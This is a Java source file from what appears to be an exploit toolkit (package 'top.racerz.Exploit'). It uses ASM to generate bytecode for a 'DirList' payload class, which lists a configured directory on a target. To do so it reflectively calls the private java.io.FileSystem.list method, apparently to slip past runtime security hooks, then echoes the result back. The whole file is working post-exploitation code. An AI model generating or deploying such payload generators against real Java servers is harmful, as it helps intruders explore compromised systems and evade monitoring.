package top.racerz.Exploit;

import org.objectweb.asm.*;
import top.racerz.utils.StringUtil;

public class DirList implements Opcodes {

    public static void insert(ClassWriter cw) {
        String path = StringUtil.getCurrentPropertiesValue("DirList");

        FieldVisitor fv;
        {
            fv = cw.visitField(ACC_PRIVATE, "result", "Ljava/lang/String;", null, null);
            fv.visitEnd();
        }
        {
            MethodVisitor mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(11, l3);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            mv.visitLabel(l0);
            mv.visitLineNumber(13, l0);
            mv.visitLdcInsn(path);
            mv.visitVarInsn(ASTORE, 1);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(14, l4);
            mv.visitTypeInsn(NEW, "java/io/File");
            mv.visitInsn(DUP);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
            mv.visitVarInsn(ASTORE, 2);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(15, l5);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "isFile", "()Z", false);
            Label l6 = new Label();
            mv.visitJumpInsn(IFEQ, l6);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(16, l7);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "getParentFile", "()Ljava/io/File;", false);
            mv.visitVarInsn(ASTORE, 2);
            mv.visitLabel(l6);
            mv.visitLineNumber(19, l6);
            mv.visitFrame(Opcodes.F_FULL, 3, new Object[]{"DirList", "java/lang/String", "java/io/File"}, 0, new Object[]{});
            mv.visitLdcInsn("java.io.File");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(20, l8);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitLdcInsn("fs");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 4);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(21, l9);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(23, l10);
            mv.visitLdcInsn("java.io.FileSystem");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 5);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(24, l11);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitLdcInsn("list");
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("Ljava/io/File;"));
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 6);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitLineNumber(25, l12);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "setAccessible", "(Z)V", false);
            Label l13 = new Label();
            mv.visitLabel(l13);
            mv.visitLineNumber(26, l13);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "get", "(Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(CHECKCAST, "[Ljava/lang/String;");
            mv.visitTypeInsn(CHECKCAST, "[Ljava/lang/String;");
            mv.visitVarInsn(ASTORE, 7);
            Label l14 = new Label();
            mv.visitLabel(l14);
            mv.visitLineNumber(27, l14);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitMethodInsn(INVOKESTATIC, "java/util/Arrays", "toString", "([Ljava/lang/Object;)Ljava/lang/String;", false);
            mv.visitFieldInsn(PUTFIELD, "DirList", "result", "Ljava/lang/String;");
            mv.visitLabel(l1);
            mv.visitLineNumber(31, l1);
            Label l15 = new Label();
            mv.visitJumpInsn(GOTO, l15);
            mv.visitLabel(l2);
            mv.visitLineNumber(29, l2);
            mv.visitFrame(Opcodes.F_FULL, 1, new Object[]{"DirList"}, 1, new Object[]{"java/lang/Exception"});
            mv.visitVarInsn(ASTORE, 1);
            Label l16 = new Label();
            mv.visitLabel(l16);
            mv.visitLineNumber(30, l16);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitLdcInsn("\u6267\u884c\u8fc7\u7a0b\u51fa\u9519\uff0c\u52a8\u4f5c\u53ef\u80fd\u6267\u884c\u5931\u8d25");
            mv.visitFieldInsn(PUTFIELD, "DirList", "result", "Ljava/lang/String;");
            mv.visitLabel(l15);
            mv.visitLineNumber(33, l15);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "DirList", "echo", "()V", false);
            Label l17 = new Label();
            mv.visitLabel(l17);
            mv.visitLineNumber(34, l17);
            mv.visitInsn(RETURN);
            Label l18 = new Label();
            mv.visitLabel(l18);
            mv.visitLocalVariable("path", "Ljava/lang/String;", null, l4, l1, 1);
            mv.visitLocalVariable("file", "Ljava/io/File;", null, l5, l1, 2);
            mv.visitLocalVariable("clazz", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l8, l1, 3);
            mv.visitLocalVariable("field", "Ljava/lang/reflect/Field;", null, l9, l1, 4);
            mv.visitLocalVariable("fs", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", l11, l1, 5);
            mv.visitLocalVariable("m", "Ljava/lang/reflect/Method;", null, l12, l1, 6);
            mv.visitLocalVariable("result", "[Ljava/lang/String;", null, l14, l1, 7);
            mv.visitLocalVariable("e", "Ljava/lang/Exception;", null, l16, l15, 1);
            mv.visitLocalVariable("this", "LDirList;", null, l3, l18, 0);
            mv.visitMaxs(6, 8);
            mv.visitEnd();
        }
    }
}
